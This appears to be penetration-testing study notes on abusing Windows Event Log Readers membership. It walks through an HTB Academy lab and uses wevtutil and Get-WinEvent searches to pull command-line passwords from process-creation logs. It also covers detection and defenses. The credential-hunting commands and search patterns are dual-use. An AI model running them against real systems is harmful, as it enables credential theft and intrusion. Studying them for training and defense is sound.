# Event Log Readers Group Exploitation

## 🎯 Overview

**Event Log Readers** group members have permission to access Windows event logs, particularly the **Security event log**. When process creation auditing is enabled, command line arguments are logged as **Event ID 4688**, potentially exposing sensitive information including **passwords**, **usernames**, and **authentication credentials** passed as command-line parameters.

## 📊 Process Creation Auditing Background

### Event ID 4688 - Process Creation
```cmd
# When enabled, logs contain:
- Process name and path
- Command line arguments  
- User context
- Process ID (PID)
- Parent process information
```

### Security Implications
**Common exposed data:**
- Network authentication credentials (`net use /user:username password`)
- Database connection strings
- API keys and tokens
- Service account passwords
- PowerShell script credentials

### Organizational Detection Use Cases
```cmd
# Security teams monitor for:
- Reconnaissance commands (whoami, netstat, tasklist)
- Lateral movement tools (psexec, wmic, reg)
- Data exfiltration utilities (robocopy, xcopy)
- PowerShell execution patterns
```

## 🔍 Group Membership Detection

### Verify Event Log Readers Membership
```cmd
# Check local group membership
net localgroup "Event Log Readers"

# Expected output:
Alias name     Event Log Readers
Comment        Members of this group can read event logs from local machine

Members
-------------------------------------------------------------------------------
logger
The command completed successfully.
```

### Alternative Verification Methods
```cmd
# Check current user groups
whoami /groups

# Look for:
BUILTIN\Event Log Readers                      Group S-1-5-32-573
```

## 🔎 Event Log Analysis Techniques

### Method 1: wevtutil Command Line

#### Basic Security Log Search
```cmd
# Search for /user patterns in Security log
wevtutil qe Security /rd:true /f:text | Select-String "/user"

# Sample output:
Process Command Line:   net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

#### Advanced wevtutil Usage
```cmd
# Search with alternate credentials
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"

# Search for specific patterns
wevtutil qe Security /rd:true /f:text | findstr "password"
wevtutil qe Security /rd:true /f:text | findstr "net use"
wevtutil qe Security /rd:true /f:text | findstr "psexec"
```

#### Common Search Patterns
```cmd
# Network authentication
findstr "/user"
findstr "password="
findstr "net use"

# PowerShell credentials  
findstr "-Credential"
findstr "ConvertTo-SecureString"
findstr "Get-Credential"

# Database connections
findstr "connectionstring"
findstr "sqlcmd"
findstr "mysql"
```

### Method 2: Get-WinEvent PowerShell

#### Process Creation Event Analysis
```powershell
# Filter Event ID 4688 with /user pattern
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}

# Expected output:
CommandLine
-----------
net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

#### Alternative PowerShell Searches
```powershell
# Search for password patterns
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*password*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}

# Search with alternate credentials
Get-WinEvent -LogName security -Credential (Get-Credential) | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```

#### PowerShell Operational Log Analysis
```powershell
# Access PowerShell logs (accessible to unprivileged users)
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | where { $_.Message -like '*password*' }

# Script block logging analysis
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | where { $_.ID -eq 4104 -and $_.Message -like '*credential*' }
```

## 🎯 HTB Academy Lab Solution

### Lab Environment
- **Credentials**: `logger:HTB_@cademy_stdnt!`
- **Access Method**: RDP
- **Objective**: Find password for user `mary` using Event Log Readers privileges

### Detailed Step-by-Step Solution

#### 1. RDP Connection
```bash
# Connect via RDP to target (IP will be provided)
xfreerdp /v:[TARGET_IP] /u:logger /p:'HTB_@cademy_stdnt!'
```

#### 2. Verify Group Membership
```cmd
# Open Command Prompt
# Confirm Event Log Readers membership
net localgroup "Event Log Readers"

# Verify user is member:
Members
-------------------------------------------------------------------------------
logger
```

#### 3. Search Security Logs for Credentials

#### Method A: wevtutil Search
```cmd
# Search for /user patterns
wevtutil qe Security /rd:true /f:text | findstr "/user"

# Search for mary-specific entries
wevtutil qe Security /rd:true /f:text | findstr "mary"

# Search for password patterns
wevtutil qe Security /rd:true /f:text | findstr "password"
```

#### Method B: PowerShell Analysis
```powershell
# Open PowerShell
# Search Event ID 4688 for mary
Get-WinEvent -LogName Security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*mary*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}

# Search for credential patterns
Get-WinEvent -LogName Security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*password*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

#### Method C: Comprehensive Search
```cmd
# Search multiple patterns systematically
wevtutil qe Security /rd:true /f:text | findstr "mary password"
wevtutil qe Security /rd:true /f:text | findstr "net use.*mary"
wevtutil qe Security /rd:true /f:text | findstr "runas.*mary"
```

#### 4. Analyze Results
```cmd
# Look for command lines containing mary's credentials:
# Examples of what to look for:
net use \\server\share /user:mary [PASSWORD]
runas /user:mary "cmd.exe" [PASSWORD]
psexec \\target -u mary -p [PASSWORD]
sqlcmd -S server -U mary -P [PASSWORD]
```

#### 5. Extract Password
```cmd
# Once command line with mary's credentials is found:
# Submit the discovered password for mary
```

### Alternative Search Strategies

#### Registry-Based Credential Search
```cmd
# Sometimes credentials stored in registry
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI /s | findstr mary
```

#### Application Event Logs
```cmd
# Check application logs
wevtutil qe Application /rd:true /f:text | findstr "mary"
wevtutil qe System /rd:true /f:text | findstr "mary"
```

#### PowerShell History Analysis
```powershell
# Check PowerShell execution logs
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | where { $_.Message -like '*mary*' }
```

## 🔒 Common Credential Exposure Scenarios

### Network Authentication
```cmd
# net use commands expose credentials
net use Z: \\fileserver\share /user:domain\mary P@ssw0rd123

# Map drive with stored credentials
net use \\server\ipc$ /user:mary SecretPassword
```

### Service Execution
```cmd
# psexec with embedded credentials
psexec \\target -u mary -p MyPassword cmd.exe

# runas commands
runas /user:mary "application.exe"
```

### Database Connections
```cmd
# SQL Server authentication
sqlcmd -S sqlserver -U mary -P DatabasePass

# MySQL connections
mysql -h server -u mary -pMySQLPass
```

### PowerShell Execution
```powershell
# Credential objects in command line
$cred = New-Object System.Management.Automation.PSCredential("mary", "Password123")

# Invoke-Command with credentials
Invoke-Command -ComputerName server -Credential (Get-Credential mary)
```

## ⚠️ Limitations and Considerations

### Registry Permissions
```cmd
# Note: Get-WinEvent requires additional permissions
# Registry key: HKLM\System\CurrentControlSet\Services\Eventlog\Security
# Event Log Readers membership alone may not be sufficient for PowerShell access
```

### Log Retention
```cmd
# Event logs have size limits and rotation
# Older events may be overwritten
# Check log configuration: eventvwr.msc
```

### Operational Awareness
```cmd
# Event log access may be monitored
# Leave minimal forensic footprint
# Document findings for client reporting
```

## 🔍 Detection Indicators

### Event Log Access
```cmd
# Monitor for Event IDs:
Event ID 1102 - Audit log cleared
Event ID 4663 - Access attempt to object (event logs)
Event ID 4656 - Handle to object requested
```

### Tool Usage Patterns
```cmd
# Suspicious activities:
- Multiple wevtutil executions
- PowerShell Get-WinEvent queries
- Pattern-based event log searches
- Non-administrative users accessing Security logs
```

## 🛡️ Defense Strategies

### Command Line Auditing Best Practices
```cmd
# Prevent credential exposure:
- Use credential managers instead of command-line passwords
- Implement script-based authentication
- Avoid embedding credentials in batch files
- Use service accounts with stored credentials
```

### Event Log Protection
```cmd
# Security measures:
- Implement log forwarding to SIEM
- Set appropriate log retention policies
- Monitor Event Log Readers group membership
- Enable additional audit categories
```

### Detection Rules
```cmd
# Monitor for:
- Unusual event log access patterns
- Command lines containing credential indicators
- Event Log Readers group modifications
- Non-business hour log access
```

## 📋 Event Log Readers Exploitation Checklist

### Prerequisites
- [ ] **Event Log Readers membership** verified
- [ ] **Process creation auditing enabled** on target
- [ ] **Command line logging configured** (Event ID 4688)
- [ ] **Network/RDP access** to target system

### Reconnaissance
- [ ] **Verify group membership** (`net localgroup "Event Log Readers"`)
- [ ] **Check log accessibility** (Security, Application, System)
- [ ] **Identify time ranges** for credential search
- [ ] **Determine search patterns** based on target users

### Credential Search
- [ ] **wevtutil searches** for credential patterns
- [ ] **PowerShell analysis** of Event ID 4688
- [ ] **Alternative log sources** (PowerShell Operational)
- [ ] **Pattern-based filtering** (/user, password, net use)

### Analysis and Extraction
- [ ] **Parse command lines** for embedded credentials
- [ ] **Identify user accounts** and passwords
- [ ] **Validate credential format** and complexity
- [ ] **Document findings** for reporting

## 💡 Key Takeaways

1. **Event Log Readers** provides access to sensitive command-line history
2. **Process creation auditing** often exposes embedded credentials
3. **wevtutil and Get-WinEvent** are primary analysis tools
4. **Command-line passwords** are common in enterprise environments
5. **PowerShell logs** may contain additional sensitive information
6. **Pattern-based searches** effectively identify credential exposure
7. **Minimal privileges** can yield high-value intelligence

---

*Event Log Readers group membership provides valuable reconnaissance capabilities through analysis of logged command-line executions and process creation events.* 